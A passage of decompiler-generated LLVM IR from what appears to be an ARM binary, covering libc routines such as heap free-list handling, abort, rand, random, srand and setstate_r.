dec_label_pc_12adc:                               ; preds = %dec_label_pc_12acc
  %v1_12adc = add i32 %v1_12ad0, 44
  %v3_12ae0 = icmp ult i32 %v2_12ab4, %v1_12adc
  br i1 %v3_12ae0, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_12adc
  store i32 %v2_12ad4, i32* %v1_12ab4, align 4
  %v1_12aec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_12aec, i32* %r0.global-to-local, align 4
  ret i32 %v1_12aec

.thread2:                                         ; preds = %dec_label_pc_12adc
  %v1_12af4 = add i32 %v0_12af4, 4
  %v2_12af4 = inttoptr i32 %v1_12af4 to i32*
  %v3_12af4 = load i32, i32* %v2_12af4, align 4
  store i32 %v3_12af4, i32* %r2.global-to-local, align 4
  %v2_12af8 = icmp eq i32 %v3_12af4, 0
  br i1 %v2_12af8, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_12afc = add i32 %v0_12af4, 8
  %v3_12afc = inttoptr i32 %v2_12afc to i32*
  %v4_12afc = load i32, i32* %v3_12afc, align 4
  %v3_12b00 = add i32 %v3_12af4, 8
  %v4_12b00 = inttoptr i32 %v3_12b00 to i32*
  store i32 %v4_12afc, i32* %v4_12b00, align 4
  %v0_12b04.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_12b04 = phi i32 [ %v0_12af4, %.thread2 ], [ %v0_12b04.pre, %bb17 ]
  %v1_12b04 = add i32 %v0_12b04, 8
  %v2_12b04 = inttoptr i32 %v1_12b04 to i32*
  %v3_12b04 = load i32, i32* %v2_12b04, align 4
  store i32 %v3_12b04, i32* %r2.global-to-local, align 4
  %v1_12b08 = add i32 %v0_12b04, 4
  %v2_12b08 = inttoptr i32 %v1_12b08 to i32*
  %v3_12b08 = load i32, i32* %v2_12b08, align 4
  %v2_12b0c = icmp eq i32 %v3_12b04, 0
  br i1 %v2_12b0c, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_12b10 = add i32 %v3_12b04, 4
  %v4_12b10 = inttoptr i32 %v3_12b10 to i32*
  store i32 %v3_12b08, i32* %v4_12b10, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_12b14 = load i32, i32* %lr.global-to-local, align 4
  %v3_12b14 = inttoptr i32 %v2_12b14 to i32*
  store i32 %v3_12b08, i32* %v3_12b14, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_12b18 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_12b18

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12ab4
  %v1_12b1c = add i32 %v0_12af4, 4
  %v2_12b1c = inttoptr i32 %v1_12b1c to i32*
  %v3_12b1c = load i32, i32* %v2_12b1c, align 4
  store i32 %v3_12b1c, i32* %ip.global-to-local, align 4
  %v2_12b20 = icmp eq i32 %v3_12b1c, 0
  br i1 %v2_12b20, label %dec_label_pc_12b20.dec_label_pc_12b28.loopexit_crit_edge, label %dec_label_pc_12ab4

dec_label_pc_12b20.dec_label_pc_12b28.loopexit_crit_edge: ; preds = %dec_label_pc_12b1c
  br label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %dec_label_pc_12acc, %entry, %dec_label_pc_12b20.dec_label_pc_12b28.loopexit_crit_edge, %dec_label_pc_12ac8
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12b1c, { 1, 2, 0 }
  uselistorder i32 %v0_12b04, { 1, 0 }
  uselistorder i32 %v1_12ad0, { 0, 2, 1, 3 }
  uselistorder i1 %v9_12ac0, { 1, 0 }
  uselistorder i32 %v2_12ab4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_12af4, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_12b28, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12ab4, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_12b30 = load i32, i32* @r2, align 4
  %v2_12b30 = icmp eq i32 %v0_12b30, 0
  %v0_12b34 = load i32, i32* @r3, align 4
  %v1_12b34 = load i32, i32* @r1, align 4
  %v2_12b34 = add i32 %v1_12b34, 4
  %v3_12b34 = inttoptr i32 %v2_12b34 to i32*
  store i32 %v0_12b34, i32* %v3_12b34, align 4
  %v0_12b38 = load i32, i32* @r2, align 4
  %v1_12b38 = load i32, i32* @r1, align 4
  %v2_12b38 = add i32 %v1_12b38, 8
  %v3_12b38 = inttoptr i32 %v2_12b38 to i32*
  store i32 %v0_12b38, i32* %v3_12b38, align 4
  %v1_12b40 = load i32, i32* @r1, align 4
  br i1 %v2_12b30, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_12b3c = load i32, i32* @r2, align 4
  %v3_12b3c = add i32 %v2_12b3c, 4
  %v4_12b3c = inttoptr i32 %v3_12b3c to i32*
  store i32 %v1_12b40, i32* %v4_12b3c, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_12b40 = load i32, i32* @r0, align 4
  %v3_12b40 = inttoptr i32 %v2_12b40 to i32*
  store i32 %v1_12b40, i32* %v3_12b40, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_12b44 = load i32, i32* @r3, align 4
  %v2_12b44 = icmp eq i32 %v0_12b44, 0
  br i1 %v2_12b44, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_12b48 = load i32, i32* @r1, align 4
  %v3_12b48 = add i32 %v0_12b44, 8
  %v4_12b48 = inttoptr i32 %v3_12b48 to i32*
  store i32 %v1_12b48, i32* %v4_12b48, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_12b4c = load i32, i32* @r0, align 4
  ret i32 %v1_12b4c

; uselistorder directives
  uselistorder i32 %v1_12b40, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_12b50 = load i32, i32* @r2, align 4
  %v2_12b50 = icmp eq i32 %v0_12b50, 0
  %v1_12b54 = load i32, i32* @r1, align 4
  br i1 %v2_12b50, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_12b54 = load i32, i32* @r0, align 4
  %v3_12b54 = inttoptr i32 %v2_12b54 to i32*
  store i32 %v1_12b54, i32* %v3_12b54, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_12b58 = add i32 %v0_12b50, 4
  %v4_12b58 = inttoptr i32 %v3_12b58 to i32*
  store i32 %v1_12b54, i32* %v4_12b58, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_12b5c = load i32, i32* @r2, align 4
  %v1_12b5c = load i32, i32* @r1, align 4
  %v2_12b5c = add i32 %v1_12b5c, 8
  %v3_12b5c = inttoptr i32 %v2_12b5c to i32*
  store i32 %v0_12b5c, i32* %v3_12b5c, align 4
  %v1_12b60 = load i32, i32* @r0, align 4
  ret i32 %v1_12b60

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12b64 = load i32, i32* @r4, align 4
  store i32 %v3_12b64, i32* %stack_var_-20, align 4
  %v2_12b68 = load i32, i32* %arg1, align 4
  store i32 %v2_12b68, i32* %r4.global-to-local, align 4
  %v2_12b6c = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12b882 = icmp eq i32 %v2_12b68, 0
  br i1 %v2_12b882, label %dec_label_pc_12c38, label %dec_label_pc_12b78

dec_label_pc_12b78:                               ; preds = %entry, %dec_label_pc_12b80
  %v0_12bc8 = phi i32 [ %v0_12bd0, %dec_label_pc_12b80 ], [ 0, %entry ]
  %v0_12bd0 = phi i32 [ %v3_12b84, %dec_label_pc_12b80 ], [ %v2_12b68, %entry ]
  %v1_12b8c5.in = phi i32 [ %v3_12b84, %dec_label_pc_12b80 ], [ %v2_12b68, %entry ]
  %v1_12b8c5 = add i32 %v1_12b8c5.in, 12
  %v3_12b78 = icmp ult i32 %v1_12b8c5, %arg2
  br i1 %v3_12b78, label %dec_label_pc_12b80, label %dec_label_pc_12b98

dec_label_pc_12b80:                               ; preds = %dec_label_pc_12b78
  store i32 %v0_12bd0, i32* %r6.global-to-local, align 4
  %v1_12b84 = add i32 %v0_12bd0, 4
  %v2_12b84 = inttoptr i32 %v1_12b84 to i32*
  %v3_12b84 = load i32, i32* %v2_12b84, align 4
  store i32 %v3_12b84, i32* %r4.global-to-local, align 4
  %v2_12b88 = icmp eq i32 %v3_12b84, 0
  br i1 %v2_12b88, label %dec_label_pc_12b88.dec_label_pc_12c38.loopexit_crit_edge, label %dec_label_pc_12b78

dec_label_pc_12b98:                               ; preds = %dec_label_pc_12b78
  %v1_12b98 = inttoptr i32 %v0_12bd0 to i32*
  %v2_12b98 = load i32, i32* %v1_12b98, align 4
  store i32 %v2_12b98, i32* @ip, align 4
  %v2_12b9c = sub i32 %v0_12bd0, %v2_12b98
  %v1_12ba0 = add i32 %v2_12b9c, 12
  %v3_12ba4 = icmp uge i32 %v1_12ba0, %v2_12b6c
  %v9_12ba4 = icmp eq i32 %v1_12ba0, %v2_12b6c
  %v2_12ba8 = xor i1 %v9_12ba4, true
  %v3_12ba8 = and i1 %v3_12ba4, %v2_12ba8
  br i1 %v3_12ba8, label %dec_label_pc_12c38, label %dec_label_pc_12bac

dec_label_pc_12bac:                               ; preds = %dec_label_pc_12b98
  %v2_12bac = add i32 %v2_12b98, %arg3
  store i32 %v2_12bac, i32* %r7.global-to-local, align 4
  br i1 %v9_12ba4, label %dec_label_pc_12bb4, label %dec_label_pc_12be0

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12bac
  %v2_12bb4 = icmp eq i32 %v0_12bc8, 0
  br i1 %v2_12bb4, label %dec_label_pc_12c2c, label %dec_label_pc_12bbc

dec_label_pc_12bbc:                               ; preds = %dec_label_pc_12bb4
  %v1_12bbc = add i32 %v0_12bc8, 12
  %v9_12bc0 = icmp eq i32 %v1_12bbc, %arg2
  br i1 %v9_12bc0, label %dec_label_pc_12bc8, label %dec_label_pc_12c2c

dec_label_pc_12bc8:                               ; preds = %dec_label_pc_12bbc
  %v1_12bc8 = inttoptr i32 %v0_12bc8 to i32*
  %v2_12bc8 = load i32, i32* %v1_12bc8, align 4
  %v1_12bcc = add i32 %v0_12bc8, 8
  %v2_12bcc = inttoptr i32 %v1_12bcc to i32*
  %v3_12bcc = load i32, i32* %v2_12bcc, align 4
  store i32 %v3_12bcc, i32* @r2, align 4
  store i32 %v0_12bd0, i32* @r1, align 4
  %v2_12bd4 = add i32 %v2_12bc8, %v2_12bac
  store i32 %v2_12bd4, i32* %r7.global-to-local, align 4
  %v0_12bd8 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_12c2c

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12bac
  %v1_12be0 = add i32 %v0_12bd0, 4
  %v2_12be0 = inttoptr i32 %v1_12be0 to i32*
  %v3_12be0 = load i32, i32* %v2_12be0, align 4
  store i32 %v3_12be0, i32* %r5.global-to-local, align 4
  %v2_12be4 = icmp eq i32 %v3_12be0, 0
  br i1 %v2_12be4, label %dec_label_pc_12c18, label %dec_label_pc_12bec

dec_label_pc_12bec:                               ; preds = %dec_label_pc_12be0
  %v1_12bec = inttoptr i32 %v3_12be0 to i32*
  %v2_12bec = load i32, i32* %v1_12bec, align 4
  store i32 %v2_12bec, i32* @ip, align 4
  %v2_12bf0 = sub i32 %v3_12be0, %v2_12bec
  %v1_12bf4 = add i32 %v2_12bf0, 12
  %v9_12bf8 = icmp eq i32 %v2_12b6c, %v1_12bf4
  br i1 %v9_12bf8, label %dec_label_pc_12c00, label %dec_label_pc_12c18

dec_label_pc_12c00:                               ; preds = %dec_label_pc_12bec
  store i32 %v0_12bc8, i32* @r2, align 4
  store i32 %v3_12be0, i32* @r1, align 4
  %v2_12c08 = add i32 %v2_12bec, %v2_12bac
  store i32 %v2_12c08, i32* %r7.global-to-local, align 4
  %v0_12c0c = call i32 @__heap_link_free_area_after()
  %v0_12c10 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12c10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12c2c

dec_label_pc_12c18:                               ; preds = %dec_label_pc_12bec, %dec_label_pc_12be0
  %v2_12c18 = add i32 %v0_12bd0, %arg3
  store i32 %v2_12c18, i32* %r4.global-to-local, align 4
  store i32 %v3_12be0, i32* @r3, align 4
  store i32 %v0_12bc8, i32* @r2, align 4
  store i32 %v2_12c18, i32* @r1, align 4
  %v0_12c28 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_12c2c

dec_label_pc_12c2c:                               ; preds = %dec_label_pc_12bbc, %dec_label_pc_12bb4, %dec_label_pc_12c00, %dec_label_pc_12bc8, %dec_label_pc_12c18
  %v0_12c2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12c2c, i32* %r5.global-to-local, align 4
  %v0_12c30 = load i32, i32* %r7.global-to-local, align 4
  %v2_12c30 = inttoptr i32 %v0_12c2c to i32*
  store i32 %v0_12c30, i32* %v2_12c30, align 4
  br label %dec_label_pc_12c50

dec_label_pc_12b88.dec_label_pc_12c38.loopexit_crit_edge: ; preds = %dec_label_pc_12b80
  br label %dec_label_pc_12c38

dec_label_pc_12c38:                               ; preds = %entry, %dec_label_pc_12b88.dec_label_pc_12c38.loopexit_crit_edge, %dec_label_pc_12b98
  %v1_12c38 = add i32 %v2_12b6c, -12
  store i32 %v1_12c38, i32* %r5.global-to-local, align 4
  %v3_12c3c = inttoptr i32 %v1_12c38 to i32*
  store i32 %arg3, i32* %v3_12c3c, align 4
  %v0_12c40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12c40, i32* @r3, align 4
  %v0_12c44 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12c44, i32* @r2, align 4
  %v0_12c48 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12c48, i32* @r1, align 4
  %v0_12c4c = call i32 @__heap_link_free_area()
  br label %dec_label_pc_12c50

dec_label_pc_12c50:                               ; preds = %dec_label_pc_12c2c, %dec_label_pc_12c38
  %v0_12c50 = load i32, i32* %r5.global-to-local, align 4
  %v2_12c54 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12c54, i32* @r4, align 4
  ret i32 %v0_12c50

; uselistorder directives
  uselistorder i32 %v3_12be0, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_12ba4, { 1, 0 }
  uselistorder i32 %v3_12b84, { 2, 3, 1, 0 }
  uselistorder i32 %v0_12bd0, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_12bc8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12c50, { 1, 0 }
  uselistorder label %dec_label_pc_12c38, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12c2c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_12b78, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_12c74.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_12c58 = ptrtoint i32* %stack_var_-268 to i32
  %v1_12c68 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_12c74 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_12c74

dec_label_pc_12c74:                               ; preds = %dec_label_pc_12c74.lr.ph, %dec_label_pc_12c74
  %v1_12c78 = phi i32 [ 31, %dec_label_pc_12c74.lr.ph ], [ %v1_12c84, %dec_label_pc_12c74 ]
  %v4_12c78 = mul i32 %v1_12c78, 4
  %v5_12c78 = add i32 %v4_12c78, %v2_12c74
  %v2_12c80 = add i32 %v5_12c78, -128
  %v3_12c80 = inttoptr i32 %v2_12c80 to i32*
  store i32 0, i32* %v3_12c80, align 4
  %v0_12c84 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c84 = add i32 %v0_12c84, -1
  store i32 %v1_12c84, i32* %r1.global-to-local, align 4
  %v6_12c84 = icmp slt i32 %v1_12c84, 0
  br i1 %v6_12c84, label %dec_label_pc_12c8c, label %dec_label_pc_12c74

dec_label_pc_12c8c:                               ; preds = %dec_label_pc_12c74
  %v2_12c8c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_12c8c, i32* @r4, align 4
  store i32 %v2_12c8c, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_12c98 = call i32 @__sigaddset()
  %v2_12c9c = icmp eq i32 %v0_12c98, 0
  br i1 %v2_12c9c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12c8c
  store i32 %v2_12c8c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12c8c, %bb
  store i32 76976, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12c9c, i32 ptrtoint (i32* @global_var_faf8.752 to i32))
  %v2_12cb4 = load i32, i32* @global_var_29d60.754, align 4
  %v2_12cb8 = icmp eq i32 %v2_12cb4, 0
  br i1 %v2_12cb8, label %dec_label_pc_12cc0, label %dec_label_pc_12cf0

dec_label_pc_12cc0:                               ; preds = %.thread1
  store i32 1, i32* @global_var_29d60.754, align 4
  br label %dec_label_pc_12cc8

dec_label_pc_12cc8:                               ; preds = %dec_label_pc_12d40, %dec_label_pc_12cc0
  store i32 77016, i32* @lr, align 4
  %v1_12cd4 = call i32 @__pthread_return_0()
  %v1_12cdc = call i32 @__raise(i32 6)
  store i32 77040, i32* @lr, align 4
  %v1_12cec = call i32 @__pthread_return_0()
  %v2_12cf4.pre = load i32, i32* @global_var_29d60.754, align 4
  br label %dec_label_pc_12cf0

dec_label_pc_12cf0:                               ; preds = %.thread1, %dec_label_pc_12cc8
  %v0_12d64 = phi i32 [ %v2_12cb4, %.thread1 ], [ %v2_12cf4.pre, %dec_label_pc_12cc8 ]
  store i32 ptrtoint (i32* @global_var_29d60.754 to i32), i32* %ip.global-to-local, align 4
  %v7_12cf8 = icmp eq i32 %v0_12d64, 1
  br i1 %v7_12cf8, label %dec_label_pc_12d28.lr.ph, label %dec_label_pc_12d5c

dec_label_pc_12d28.lr.ph:                         ; preds = %dec_label_pc_12cf0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_29d60.754, align 4
  %v2_12d14 = bitcast i32* %stack_var_-268 to i8*
  %v3_12d14 = call i32 @__GI_memset(i8* %v2_12d14, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12d28

dec_label_pc_12d28:                               ; preds = %dec_label_pc_12d28.lr.ph, %dec_label_pc_12d28
  %v1_12d2c = phi i32 [ 31, %dec_label_pc_12d28.lr.ph ], [ %v1_12d38, %dec_label_pc_12d28 ]
  %v4_12d2c = mul i32 %v1_12d2c, 4
  %v5_12d2c = add i32 %v4_12d2c, %v2_12c74
  %v2_12d34 = add i32 %v5_12d2c, -264
  %v3_12d34 = inttoptr i32 %v2_12d34 to i32*
  store i32 -1, i32* %v3_12d34, align 4
  %v0_12d38 = load i32, i32* %r1.global-to-local, align 4
  %v1_12d38 = add i32 %v0_12d38, -1
  store i32 %v1_12d38, i32* %r1.global-to-local, align 4
  %v6_12d38 = icmp slt i32 %v1_12d38, 0
  br i1 %v6_12d38, label %dec_label_pc_12d40, label %dec_label_pc_12d28

dec_label_pc_12d40:                               ; preds = %dec_label_pc_12d28
  store i32 %v2_12c58, i32* %r1.global-to-local, align 4
  %v4_12d54 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_12cc8

dec_label_pc_12d5c:                               ; preds = %dec_label_pc_12cf0
  %v7_12d5c = icmp eq i32 %v0_12d64, 2
  br i1 %v7_12d5c, label %dec_label_pc_12d64, label %dec_label_pc_12d70

dec_label_pc_12d64:                               ; preds = %dec_label_pc_12d5c
  store i32 3, i32* @global_var_29d60.754, align 4
  %v0_12d6c = call i32 @abort()
  %v2_12d70.pre = load i32, i32* @global_var_29d60.754, align 4
  br label %dec_label_pc_12d70

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12d5c, %dec_label_pc_12d64
  %v1_12d78 = phi i32 [ %v0_12d64, %dec_label_pc_12d5c ], [ %v2_12d70.pre, %dec_label_pc_12d64 ]
  %v7_12d74 = icmp eq i32 %v1_12d78, 3
  br i1 %v7_12d74, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_12d70
  %v2_12d80 = load i32, i32* %ip.global-to-local, align 4
  %v3_12d80 = inttoptr i32 %v2_12d80 to i32*
  store i32 4, i32* %v3_12d80, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12d70, %bb27
  call void @__pseudo_cond_branch(i1 %v7_12d74, i32 ptrtoint (i32* @global_var_f6e4.756 to i32))
  br label %dec_label_pc_12d88

dec_label_pc_12d88:                               ; preds = %dec_label_pc_12d88, %.thread3
  %v0_12d88 = call i32 @abort()
  br label %dec_label_pc_12d88

; uselistorder directives
  uselistorder i32 %v1_12d38, { 2, 1, 0 }
  uselistorder i32 %v1_12c84, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32* @global_var_29d60.754, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12d70, { 1, 0 }
  uselistorder label %dec_label_pc_12d28, { 1, 0 }
  uselistorder label %dec_label_pc_12cf0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12c74, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_12da0 = call i32 @random()
  ret i32 %v0_12da0

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 2, 4, 3, 8, 7, 10, 9, 1, 0, 6, 5 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12da4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23a14.758 to i32), i32* @r4, align 4
  %v2_12dac = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_12dac, i32* @r0, align 4
  %v1_12dc4 = call i32 @__pthread_return_void()
  %v1_12dd4 = call i32 @__pthread_return_0()
  %v2_12dd8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_12de0 = call i32 @__GI_random_r(i32* inttoptr (i32 145964 to i32*), i32 %v2_12dd8)
  store i32 %v2_12dac, i32* @r0, align 4
  store i32 77304, i32* @lr, align 4
  %v1_12df4 = call i32 @__pthread_return_void()
  %v3_12df8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_12da4, i32* @r4, align 4
  ret i32 %v3_12df8
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_12e24 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12e24, i32* @r0, align 4
  %v1_12e40 = call i32 @__pthread_return_void()
  %v1_12e50 = call i32 @__pthread_return_0()
  %v3_12e60 = load i32, i32* bitcast (i32** @global_var_23a34.771 to i32*), align 4
  store i32 %v3_12e60, i32* @r4, align 4
  %v3_12e64 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_23a2c)
  %v1_12e6c = icmp slt i32 %v3_12e64, 0
  store i32 %v2_12e24, i32* @r0, align 4
  %. = select i1 %v1_12e6c, i32 0, i32 ptrtoint (i32** @global_var_23a30.773 to i32)
  %v1_12e84 = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_12eb4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_12eb4, i32* @r0, align 4
  %v1_12ed8 = call i32 @__pthread_return_void()
  %v1_12ee8 = call i32 @__pthread_return_0()
  %v0_12ef0 = load i32, i32* @r5, align 4
  %v0_12ef4 = load i32, i32* @r6, align 4
  %v0_12ef8 = load i32, i32* @r8, align 4
  store i32 %v0_12ef8, i32* @r0, align 4
  %v3_12efc = load i32, i32* bitcast (i32** @global_var_23a34.771 to i32*), align 4
  store i32 %v3_12efc, i32* @r4, align 4
  %v4_12f00 = inttoptr i32 %v0_12ef8 to i32*
  %v5_12f00 = call i32 @__GI_initstate_r(i32* %v4_12f00, i32 %v0_12ef0, i32 %v0_12ef4, i32 ptrtoint (i32* @global_var_23a2c to i32))
  store i32 %v2_12eb4, i32* @r0, align 4
  %v1_12f14 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_23a30.773 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_12f44 = load i32, i32* @r4, align 4
  %v9_12f44 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_23a14.758 to i32), i32* @r4, align 4
  %v2_12f4c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_12f4c, i32* @r0, align 4
  %v1_12f68 = call i32 @__pthread_return_void()
  %v1_12f78 = call i32 @__pthread_return_0()
  %v0_12f7c = load i32, i32* @r6, align 4
  store i32 %v0_12f7c, i32* @r0, align 4
  %v2_12f84 = inttoptr i32 %v0_12f7c to i32*
  %v3_12f84 = call i32 @srandom_r(i32* %v2_12f84, i32 ptrtoint (i32* @global_var_23a2c to i32))
  store i32 %v2_12f4c, i32* @r0, align 4
  store i32 77728, i32* @lr, align 4
  %v1_12f9c = call i32 @__pthread_return_void()
  store i32 %v3_12f44, i32* @r4, align 4
  store i32 %v9_12f44, i32* @r6, align 4
  ret i32 %v1_12f9c

; uselistorder directives
  uselistorder i32* @global_var_23a2c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23a2c to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_12fc0 = add i32 %tmp, 12
  %v2_12fc0 = inttoptr i32 %v1_12fc0 to i32*
  %v3_12fc0 = load i32, i32* %v2_12fc0, align 4
  %v3_12fc4 = load i32, i32* @r4, align 4
  store i32 %v3_12fc4, i32* %stack_var_-20, align 4
  %v2_12fc8 = icmp eq i32 %v3_12fc0, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_12fc8, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_12fd41 = add i32 %tmp, 8
  %v2_12fd42 = inttoptr i32 %v1_12fd41 to i32*
  %v3_12fd43 = load i32, i32* %v2_12fd42, align 4
  store i32 %v3_12fd43, i32* %r1.global-to-local, align 4
  %v3_12fe8 = add i32 %v3_12fd43, -4
  %v4_12fe8 = inttoptr i32 %v3_12fe8 to i32*
  store i32 0, i32* %v4_12fe8, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_12fd0 = add i32 %tmp, 4
  %v3_12fd0 = inttoptr i32 %v2_12fd0 to i32*
  %v4_12fd0 = load i32, i32* %v3_12fd0, align 4
  %v1_12fd4 = add i32 %tmp, 8
  %v2_12fd4 = inttoptr i32 %v1_12fd4 to i32*
  %v3_12fd4 = load i32, i32* %v2_12fd4, align 4
  store i32 %v3_12fd4, i32* %r1.global-to-local, align 4
  %v3_12fd8 = sub i32 %v4_12fd0, %v3_12fd4
  %v4_12fdc = sdiv i32 %v3_12fd8, 4
  %v4_12fe4 = mul i32 %v4_12fdc, 5
